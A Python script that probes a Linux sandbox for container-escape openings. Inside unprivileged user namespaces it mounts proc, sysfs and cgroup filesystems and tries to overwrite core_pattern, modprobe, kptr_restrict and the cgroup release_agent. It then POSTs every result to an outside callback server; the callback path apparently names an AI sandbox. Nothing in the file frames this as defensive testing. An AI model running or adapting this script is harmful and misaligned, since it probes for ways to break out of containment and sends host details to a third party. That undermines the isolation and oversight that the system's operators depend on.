#!/usr/bin/env python3
import json, os, pathlib, subprocess, time, urllib.request
SINK='https://54.209.51.244.sslip.io/callback/snapgpt-userns-mount-basic3-20261106'
out={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'tests':{}}
def run(name, script, timeout=45):
    try:
        p=subprocess.run(['sh','-c',script],capture_output=True,text=True,timeout=timeout)
        out['tests'][name]={'rc':p.returncode,'stdout':p.stdout[-30000:],'stderr':p.stderr[-10000:]}
    except Exception as e:
        out['tests'][name]={'error':repr(e)}

run('proc_sysctl', r'''rm -rf /tmp/nsp; mkdir -p /tmp/nsp/proc; unshare -Ur -m --propagation private sh -c 'mkdir -p /tmp/nsp/proc; mount -t proc proc /tmp/nsp/proc; echo mount_rc=$?; for f in kernel/core_pattern kernel/modprobe kernel/hotplug kernel/randomize_va_space vm/mmap_min_addr; do echo ===$f; cat /tmp/nsp/proc/sys/$f 2>&1; printf X > /tmp/nsp/proc/sys/$f 2>&1; echo write_rc=$?; cat /tmp/nsp/proc/sys/$f 2>&1; done' 2>&1''')
run('tmpfs', r'''rm -rf /tmp/nst; mkdir -p /tmp/nst; unshare -Ur -m --propagation private sh -c 'mount -t tmpfs tmpfs /tmp/nst; echo mount_rc=$?; printf OK > /tmp/nst/x; cat /tmp/nst/x' 2>&1''')
run('overlay', r'''rm -rf /tmp/nso; mkdir -p /tmp/nso/lower /tmp/nso/upper /tmp/nso/work /tmp/nso/merged; unshare -Ur -m --propagation private sh -c 'mount -t overlay overlay -o lowerdir=/tmp/nso/lower,upperdir=/tmp/nso/upper,workdir=/tmp/nso/work /tmp/nso/merged; echo mount_rc=$?; printf OK > /tmp/nso/merged/x; echo write_rc=$?; cat /tmp/nso/merged/x 2>&1' 2>&1''')
run('sysfs', r'''rm -rf /tmp/nss; mkdir -p /tmp/nss; unshare -Ur -m --propagation private sh -c 'mount -t sysfs sysfs /tmp/nss; echo mount_rc=$?; ls -la /tmp/nss/kernel | head; cat /tmp/nss/kernel/kptr_restrict 2>&1; printf 0 > /tmp/nss/kernel/kptr_restrict 2>&1; echo write_rc=$?' 2>&1''')
run('cgroup_v1_variants', r'''for opts in "none,name=x" "none,name=x,release_agent=/tmp/release" "none,name=x,notify_on_release"; do rm -rf /tmp/nsc; mkdir -p /tmp/nsc; echo ===$opts; unshare -Ur -C -m --propagation private sh -c "mount -t cgroup -o '$opts' cgroup /tmp/nsc; echo mount_rc=\$?; ls -la /tmp/nsc | head; printf /bin/sh > /tmp/nsc/release_agent; echo write_rc=\$?; cat /tmp/nsc/release_agent 2>&1" 2>&1; done''')
run('cgroup_v2_controls', r'''rm -rf /tmp/nsc2; mkdir -p /tmp/nsc2; unshare -Ur -C -m --propagation private sh -c 'mount -t cgroup2 none /tmp/nsc2; echo mount_rc=$?; for f in cgroup.controllers cgroup.subtree_control cgroup.procs cgroup.threads; do echo ===$f; cat /tmp/nsc2/$f 2>&1; done; printf "+cpu +memory" > /tmp/nsc2/cgroup.subtree_control; echo subtree_rc=$?; cat /tmp/nsc2/cgroup.subtree_control 2>&1' 2>&1''')
run('bind_cgroup_remount', r'''rm -rf /tmp/nsb; mkdir -p /tmp/nsb; unshare -Ur -m --propagation private sh -c 'mount --bind /sys/fs/cgroup /tmp/nsb; echo bind_rc=$?; mount -o remount,rw,bind /tmp/nsb; echo remount_rc=$?; ls -la /tmp/nsb | head; printf 1 > /tmp/nsb/systemd/notify_on_release; echo write_rc=$?' 2>&1''')

payload=json.dumps(out,sort_keys=True,separators=(',',':')).encode()
req=urllib.request.Request(SINK,data=payload,method='POST',headers={'Content-Type':'application/json'})
try:
    with urllib.request.urlopen(req,timeout=30) as r:
        out['sink']={'status':r.status,'body':r.read().decode('utf-8','replace')[:1000]}
except Exception as e:
    out['sink']={'error':repr(e)}
print(json.dumps(out,sort_keys=True,separators=(',',':')))
